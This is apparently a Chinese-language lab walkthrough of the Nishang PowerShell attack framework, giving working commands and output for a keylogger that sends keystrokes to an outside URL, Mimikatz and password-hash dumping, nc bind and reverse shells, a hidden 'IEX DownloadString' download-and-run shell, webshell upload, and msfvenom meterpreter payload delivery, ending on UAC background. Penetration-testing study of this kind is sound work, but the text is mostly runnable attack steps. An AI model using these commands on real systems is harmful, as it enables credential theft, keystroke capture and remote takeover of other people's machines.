<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">esdsfsdfdsfsafgcvxbcvbcvxbvvbcxmmmmmmmmmmmparaBackspaceBackspaceBackspaceBackspace./gBackspacemuBackspaceippBackspaceaBackspaceBackspacec./upaEnterpaBackspaceBac...ckspaceBackspace...ceBackspaceBackspaceBackspaceBackspaceBacksp
</span></span></code></pre></div><p>它里面还有一些内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">Get-Help</span> <span class="p">.\</span><span class="n">Gather</span><span class="p">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">名称</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Gather</span><span class="p">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">摘要</span>
</span></span><span class="line"><span class="cl">    <span class="n">Nishang</span> <span class="n">Payload</span> <span class="n">which</span> <span class="n">logs</span> <span class="n">keys</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">语法</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Gather</span><span class="p">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="py">ps1</span> <span class="p">[</span><span class="n">-CheckURL</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;</span> <span class="p">[</span><span class="n">-MagicString</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;</span> <span class="p">[&lt;</span><span class="n">CommonParameters</span><span class="p">&gt;]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Gather</span><span class="p">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="py">ps1</span> <span class="p">[</span><span class="n">-persist</span><span class="p">]</span> <span class="p">[</span><span class="n">-exfil</span><span class="p">]</span> <span class="p">[</span><span class="n">-CheckURL</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;</span> <span class="p">[</span><span class="n">-MagicString</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;</span> <span class="p">[[</span><span class="n">-ExfilOption</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;]</span> <span class="p">[[</span><span class="n">-dev_key</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;]</span> <span class="p">[[</span><span class="n">-username</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;]</span> <span class="p">[[</span><span class="n">-password</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;]</span>
</span></span><span class="line"><span class="cl">    <span class="p">[[</span><span class="n">-URL</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;]</span> <span class="p">[[</span><span class="n">-DomainName</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;]</span> <span class="p">[[</span><span class="n">-AuthNS</span><span class="p">]</span> <span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;]</span> <span class="p">[&lt;</span><span class="n">CommonParameters</span><span class="p">&gt;]</span>
</span></span></code></pre></div><p>比如下面的命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Gather</span><span class="p">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="py">ps1</span> <span class="n">-CheckURL</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">hacktest</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">test</span><span class="p">.</span><span class="py">html</span> <span class="n">-MagicString</span> <span class="n">stop</span> <span class="n">-exfil</span> <span class="n">-ExfilOption</span> <span class="n">WebServer</span> <span class="n">-URL</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">hacklog</span><span class="p">.</span><span class="n">ocm</span><span class="p">/</span><span class="n">data</span><span class="p">.</span><span class="py">php</span> 
</span></span></code></pre></div><p>这个命令的作用就是检查<code>http://hacktest.com/test.html</code>是否存在字符串<code>stop</code>,如果存在那就停止记录，还会把记录的内容发送到<code>http://hacklog.ocm/data.php</code>当中。</p>
<h3 id="invoke-mimikatz-1">Invoke-Mimikatz</h3>
<p>这个老生常谈了，获取凭证的功能：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nishang</span><span class="p">\</span><span class="n">Gather</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nishang</span><span class="p">\</span><span class="n">Gather</span><span class="p">&gt;</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCerts</span>    <span class="c">#dump本机的凭证信息</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nishang</span><span class="p">\</span><span class="n">Gather</span><span class="p">&gt;</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCerts</span> <span class="n">-ComputerName</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;computer1&#34;</span><span class="p">,</span><span class="s2">&#34;computer2&#34;</span><span class="p">)</span>    <span class="c">#dump出远程的两台计算机的凭证信息</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nishang</span><span class="p">\</span><span class="n">Gather</span><span class="p">&gt;</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s2">&#34;privilege::debug exit&#34;</span> <span class="n">-ComputerName</span> <span class="s2">&#34;computer1&#34;</span>    <span class="c">#在远程的另一台计算机上运行mimikatz并执行privilege::debug exit</span>
</span></span></code></pre></div><blockquote>
<p>笔者在这里测试的Windows Server 2019 已经失败了，要去https://github.com/gentilkiwi/mimikatz 下载最新的版本才行，Nishang的mimkatz已经不能在打补丁的系统上获取到凭证了</p>
</blockquote>
<h3 id="get-passhashes">Get-PassHashes</h3>
<p>获取Hash的工具：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">mimikatz_trunk</span><span class="p">\</span><span class="n">x64</span><span class="p">&gt;</span> <span class="nb">Get-PassHashes</span>
</span></span><span class="line"><span class="cl"><span class="n">Administrator</span><span class="err">:</span><span class="mf">500</span><span class="err">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="err">:</span><span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">::</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="n">Guest</span><span class="err">:</span><span class="mf">501</span><span class="err">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="err">:</span><span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">::</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="n">DefaultAccount</span><span class="err">:</span><span class="mf">503</span><span class="err">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="err">:</span><span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">::</span><span class="err">:</span>
</span></span></code></pre></div><h3 id="get-passhints">Get-PassHints</h3>
<p>执行<code>Get-PassHints</code>获取用户的密码提示信息,我这里因为是域环境，一般是没有密码备注的。</p>
<h2 id="隐藏通信隧道">隐藏通信隧道</h2>
<h3 id="基于tcp协议的交互式shell">基于TCP协议的交互式shell</h3>
<p><code>Invoke-PowerShellTcp</code>模块是基于TCP协议的正反向连接shell，具体的参数如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-IPAddress 反向连接时需要连接到的IP地址
</span></span><span class="line"><span class="cl">-Port 反向连接时是需要连接到的端口，选择-Bind选项时是需要监听的端口
</span></span><span class="line"><span class="cl">-Reverse 反向连接
</span></span><span class="line"><span class="cl">-Bind 正向连接用到的端口监听
</span></span></code></pre></div><ol>
<li>
<p>正向连接</p>
<p>在目标机器运行脚本，执行监听端口（攻击机等会要连接该端口）</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Bind</span> <span class="n">-Port</span> <span class="mf">4445</span>
</span></span></code></pre></div><p>在kali上面运行nc工具进行连接：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc -nv 172.16.0.106 <span class="m">4445</span>                                                                                                         <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.0.106<span class="o">]</span> <span class="m">4445</span> <span class="o">(</span>?<span class="o">)</span> open
</span></span><span class="line"><span class="cl">Windows PowerShell running as user testuser on DC
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\t</span>est<span class="se">\D</span>esktop<span class="se">\&gt;</span>
</span></span></code></pre></div><blockquote>
<p>记得关闭防火墙</p>
<p>-n 直接使用IP地址，而不通过域名服务器</p>
<p>-v 显示指令执行过程</p>
</blockquote>
<ol start="2">
<li>
<p>反向连接</p>
<p>在Kali(172.16.0.107)执行监听端口：</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">4445</span>
</span></span></code></pre></div><p>在目标机器上执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">107</span> <span class="n">-Port</span> <span class="mf">4445</span>
</span></span></code></pre></div><p>就能在Kali上收到反弹回来的shell：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc -lnvp <span class="m">4445</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4445</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>172.16.0.107<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.0.106<span class="o">]</span> <span class="m">59992</span>
</span></span><span class="line"><span class="cl">Windows PowerShell running as user testuser on DC
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\t</span>est<span class="se">\D</span>esktop<span class="se">\n</span>ishang-master<span class="se">\n</span>ishang-master&gt;
</span></span></code></pre></div><p>书中还科普了一个小知识：</p>
<ul>
<li>Kali内网-目标机器外网：这个时候就用正向连接，因为外网机器有一个公网的IP，可以nc过去</li>
<li>Kali外网-目标机器内网：这个跟上面反过来，用反向连接，因为你的Kali上面有公网的IP</li>
<li>都在外网：用哪个都可以</li>
</ul>
<h3 id="基于udp协议的交互式shell">基于UDP协议的交互式shell</h3>
<p><code>Invoke-PowerShellUdp</code>模块是基于TCP协议的模块，使用方法跟上面差不多，只是<code>nc</code>需要改变一下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nvu 172.16.0.106 <span class="m">4445</span>    <span class="c1">#正向</span>
</span></span><span class="line"><span class="cl">nc -lup <span class="m">4445</span>                  <span class="c1">#反向</span>
</span></span></code></pre></div><h3 id="基于http和https协议的交互式shell">基于HTTP和HTTPS协议的交互式shell</h3>
<p><code>Invoke-PoshRatHttp</code>这个脚本是基于反向连接的，意思就是说只能在Windows攻击机上面执行监听，然后在Windows目标机器上面执行反向连接：</p>
<p>在攻击机上执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span><span class="nb">Invoke-PoshRatHttp</span> <span class="n">-IPAddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">106</span> <span class="n">-Port</span> <span class="mf">4445</span>
</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-WindowStyle</span> <span class="n">hidden</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-nologo</span> <span class="n">-noprofile</span> <span class="n">-c</span> <span class="nb">IEX </span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://172.16.0.106:4446/connect&#39;</span><span class="p">))</span>
</span></span></code></pre></div><blockquote>
<p>记得用管理员的权限</p>
</blockquote>
<p>在目标执行上面给出的命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX <span class="o">((</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://172.16.0.106:4446/connect&#39;</span><span class="o">))</span>
</span></span></code></pre></div><p>然后就会反弹一个http的shell回来：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span>  <span class="nb">Invoke-PoshRatHttp</span> <span class="n">-IPAddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">106</span> <span class="n">-Port</span> <span class="mf">4446</span>
</span></span><span class="line"><span class="cl"><span class="n">Listening</span> <span class="n">on</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">106</span><span class="err">:</span><span class="mf">4446</span>
</span></span><span class="line"><span class="cl"><span class="n">Run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">command</span> <span class="n">on</span> <span class="n">the</span> <span class="n">target</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-WindowStyle</span> <span class="n">hidden</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-nologo</span> <span class="n">-noprofile</span> <span class="n">-c</span> <span class="nb">IEX </span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">Downloa</span>
</span></span><span class="line"><span class="cl"><span class="n">dString</span><span class="p">(</span><span class="s1">&#39;http://172.16.0.106:4446/connect&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">105</span><span class="err">:</span><span class="mf">50434</span><span class="p">&gt;</span><span class="err">:</span>
</span></span></code></pre></div><p>可以使用<code>wireshark</code>进行抓包研究，看到是通过http方式进行数据传输的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">whoami</span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">100</span> <span class="ne">Continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">POST /rat HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="g">Host: 172.16.0.106:4446
</span></span></span><span class="line"><span class="cl"><span class="g">Content-Length: 23
</span></span></span><span class="line"><span class="cl"><span class="g">Expect: 100-continue
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">win-jh8n3kv3oq0\sc92n
</span></span></span><span class="line"><span class="cl"><span class="g">HTTP/1.1 200 OK
</span></span></span><span class="line"><span class="cl"><span class="g">Content-Length: 6
</span></span></span><span class="line"><span class="cl"><span class="g">Server: Microsoft-HTTPAPI/2.0
</span></span></span><span class="line"><span class="cl"><span class="g">Date: Sun, 23 Jan 2022 05:40:45 GMT
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">whoamiGET /rat HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="g">Host: 172.16.0.106:4446
</span></span></span></code></pre></div><p>Https利用方式是一样的，使用这个模块即可<code>Invoke-PoshRatHttp</code>。</p>
<h3 id="webshell后门">Webshell后门</h3>
<p>这个大家应该很熟悉了，Nishang使用aspx的shell，里面用的是powerhsell的命令，把脚本文件<code>Antak-WebShell\antak.aspx</code>上传到网站目录即可。</p>
<h2 id="权限提升-1">权限提升</h2>
<h3 id="下载执行">下载执行</h3>
<p><code>Download_Execute</code>是Nishang中的下载执行脚本，常用于下载文本文件，然后将器转换为可执行文件执行。</p>
<p>我们先在msf生成一个exe后门文件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/meterpreter/reverse_https  -f exe -o /home/kali/muma.exe                                                 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">658</span> bytes
</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
</span></span><span class="line"><span class="cl">Saved as: /home/kali/muma.exe
</span></span></code></pre></div><p>建立监听：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kali@kali:~# sudo msfconsole
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_https
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_https
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 172.16.0.107 
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; 172.16.0.107
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">4444</span>
</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">4444</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span></code></pre></div><p>在kali建立http服务器，然后在Windows攻击机上执行powershell命令下载：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="n">powershell</span> <span class="nb">wget </span><span class="s2">&#34;http://172.16.0.107:8000/muma.exe&#34;</span> <span class="n">-outfile</span> <span class="s2">&#34;muma.exe&#34;</span>
</span></span></code></pre></div><p>转化成txt文本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="n">ExetoText</span> <span class="n">muma</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">muma</span><span class="p">.</span><span class="py">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">Converted</span> <span class="n">file</span> <span class="n">written</span> <span class="n">to</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">muma</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></div><p>然后再把<code>muma.txt</code>放到一个http服务器中，在目标机器上执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="n">Download_Execute</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">107</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">muma</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></div><p>msf就上线了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: 98lr6ix5<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: 98lr6ix5<span class="o">)</span> Attaching orphaned/stageless session...
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: 98lr6ix5<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">14</span> opened <span class="o">(</span>172.16.0.107:4444 -&gt; 127.0.0.1 <span class="o">)</span> at 2022-01-23 14:06:06 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></div><blockquote>
<p>麻烦的就是要在Windows上面利用这个脚本进行转换</p>
</blockquote>
<h3 id="bypass-uac-1">Bypass UAC</h3>
<p><strong>用户帐户控制</strong>(User Account Control)是Windows Vista（及更高版本操作系统）中一组新的基础结构技术，可以帮助阻止恶意程序（有时也称为“恶意软件“）损坏系统，同时也可以帮助组织部署更易于管理的平台。</p>
<p>使用UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p>
<p>用户帐户控制(UAC)是<strong>新版Windows</strong>的核心安全功能，也是其最常被人误解的众多安全功能当中的一种。</p>
<p>Windows Vista 开始引入了 UAC，不过在 Windows Vista 上只有两种 UAC 设置——开启和关闭。如果开启，那么应用试图安装软件或更改计算机、或者更改了 Windows 设置时将弹出 UAC 提示框；如果关闭，那么 UAC 就此关闭。Windows Vista 的 UAC 一直饱受诟病就是因为这种情况下的 UAC 提示是非常频繁的（而且以前的程序迁移到不需要管理员权限需要时间）。</p>
<p>在 Windows 7 上，在开启和关闭中间新引入了两个 UAC 级别，都是在更改 Windows 设置时不通知（实际上就是加了一些 UAC 提权的白名单）。只是一个会进入“黑屏”状态，另一个不会进入此状态。从表现上看这两个只是黑屏与不黑屏，但从安全性上讲黑屏的安全性会高很多。UAC 通知时进入的黑屏状态在 Windows 中称之为“安全桌面”，这时整个桌面进入了 SYSTEM 账户，原用户账户下的所有程序都无法得知此时 UAC 弹窗的情况，也无法通过模拟用户操作来跳过这个 UAC 框。而不黑屏时，不会切换到新的桌面环境，原有程序依然可以获得此 UAC 弹窗的一些信息，这很不安全。</p>
<p><strong>但是</strong>！无论是 Windows Vista 还是 Windows 7，一旦你将 UAC 设置拖到最底，那么此时 UAC 将彻底关闭。如果你是管理员账户，那么运行的程序都将以管理员权限运行。</p>
<p>从 Windows 8 开始到现在的 Windows 10，虽然依然是上面四个设置，但拖到最底的“从不通知”时，UAC 依然是开启的状态。也就是说，用户正常启动的进程依然是标准权限，要获得管理员权限提升依然需要重启整个进程。这个安全性限制是很重要的。</p>
